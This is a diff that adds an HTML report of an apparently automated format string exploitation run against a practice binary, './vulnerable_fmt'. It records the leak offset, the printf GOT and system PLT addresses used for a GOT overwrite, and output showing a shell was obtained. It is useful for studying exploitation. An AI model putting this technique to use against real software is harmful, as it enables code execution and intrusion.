@@ -1,0 +1,25 @@
+<!DOCTYPE html><html><head><title>Format String Report</title>
+<style>
+body { font-family: monospace; background:#111; color:#eee; padding:20px; }
+h1 { color:#ff5555; } h3 { color:#55ff55; border-bottom:1px solid #333; }
+pre { background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }
+</style></head><body>
+<h1>Format String Exploitation Report</h1>
+<p><b>Binary:</b> ./vulnerable_fmt</p>
+<p><b>Arch:</b> i386</p>
+<p><b>Timestamp:</b> 2026-10-26T18:08:29.500312</p>
+<p><b>Findings:</b> 3</p>
+<ul><li>format_string_vuln</li><li>got_overwrite</li><li>shell_obtained</li></ul>
+<h3>detect</h3><pre>{
+  "vulnerable": true,
+  "offset": 4,
+  "output": "AAAA.80.804a013.ffffcb10.41414141.2431252e\nEnter command:"
+}</pre><h3>got_overwrite</h3><pre>{
+  "printf_got": "0x804c00c",
+  "system_plt": "0x8049114",
+  "payload_length": 36
+}</pre><h3>shell</h3><pre>{
+  "shell": true,
+  "output": "                                                                                                                                                                                                                                                   \u0013aaa\f\u0004\b\u000f\u0004\b\nsh: 1: Enter: not found\nPWNED_55\nuid=1000(saad) gid=1000(saad) groups=1000(saad),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),118(docker)\nsaad\n"
+}</pre>
+</body></html>
